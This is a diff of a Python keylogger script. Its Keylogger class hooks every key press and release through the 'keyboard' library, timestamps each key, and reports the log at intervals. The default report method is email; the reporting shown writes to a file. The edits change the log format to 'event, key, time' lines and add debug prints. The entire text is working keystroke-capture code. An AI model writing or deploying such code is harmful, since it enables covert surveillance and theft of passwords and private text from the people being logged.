@@ -3,32 +3,32 @@ import keyboard # for keylogs
 from threading import Timer
 from datetime import datetime
 
-SEND_REPORT_EVERY = 5 # in seconds, 60 means 1 minute and so on
+SEND_REPORT_EVERY = 5
 
+#time now printed.
+#reordered for "event, key, time"
+#still prints repeat characters at the end of the string but This
+#doesnt affect the time so it is ok - can remove it easily in the parser
 
 class Keylogger:
-#    current = ""
+    current_letter=''
 
     def __init__(self, interval, report_method="email"):
-        # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
         # this is the string variable that contains the log of all
         # the keystrokes within `self.interval`
         self.log = ""
-        # record start & end datetimes
 
 
     def callback(self, event):
-        now = datetime.now()
+        now = datetime.now().time()
         """
         This callback is invoked whenever a keyboard event is occured
         (i.e when a key is released in this example)
         """
         name = event.name
         eventtype = event.event_type
-    #    self.start_dt = event.time
-    #    self.end_dt = event.time
 
         if len(name) > 1:
             # not a character, special key (e.g ctrl, alt, etc.)
@@ -45,12 +45,15 @@ class Keylogger:
                 # replace spaces with underscores
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
+        print(f"current letter: {Keylogger.current_letter} ")
 
         if eventtype == "up":
-            name = "\n" + now.strftime("%H:%M:%S") + " Released: " + name
-        elif eventtype == "down":
-            name = "\n" + now.strftime("%H:%M:%S") + " Pressed: " + name
-
+            name = "\n" + "up," + name + "," + str(now)
+        elif eventtype == "down" and Keylogger.current_letter != name:
+            Keylogger.current_letter = name
+            print(f"name: {name}")
+            letter = name[0]
+            name = "\n" + "down," + name + "," + str(now)
 
         # finally, add the key name to our global `self.log` variable
         self.log += name
@@ -77,8 +80,6 @@ class Keylogger:
         if self.log:
             # if there is something in log, report it
             self.end_dt = datetime.now()
-            # update `self.filename`
-            #self.update_filename()
             self.report_to_file()
             # if you want to print in the console, uncomment below line
             # print(f"[{self.filename}] - {self.log}")
